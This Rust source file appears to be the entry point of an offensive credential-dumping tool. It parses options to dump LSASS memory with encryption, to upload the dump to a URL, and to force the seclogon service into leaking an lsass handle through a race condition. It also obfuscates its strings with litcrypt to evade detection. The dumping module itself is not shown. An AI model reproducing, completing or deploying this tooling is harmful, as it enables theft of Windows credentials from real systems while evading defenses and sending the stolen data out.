#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use clap::{Parser};

fn main() {

    start();
}

#[derive(Parser,Default,Debug)]
struct Arguments {
    /// Valid values: dump or decrypt
    action: String,
    #[clap(default_value="1234abcd",short, long)]
    /// Encryption key
    key: String,
    #[clap(default_value="c:\\temp\\input.txt",short, long)]
    /// Encrypted dump file
    input_file: String,
    #[clap(default_value="c:\\temp\\output.txt",short, long)]
    /// Destination path
    output_file: String,
    /// Upload URL
    #[clap(short, long)]
    upload: Option<String>,
    /// Force seclogon's service to leak a lsass handle through a race condition.
    force:Option<String>
}

fn start() {

    let args = Arguments::parse();
    let mut force = false;
    let mut upload = "".to_string();
    if args.action == "dump".to_string()
    {
        if args.upload != None
        {
            upload = args.upload.unwrap();
        }

        if args.force != None
        {
            force = true;
        }
        
        dumper::dump(&args.key, &upload, force);
    }
    else if args.action == "decrypt".to_string()
    {
        dumper::decrypt(&args.input_file, &args.key, &args.output_file);
    }
    else
    {
        print!("{}",lc!("[x] Invalid arguments. Use -h for detailed help."));
    }

}
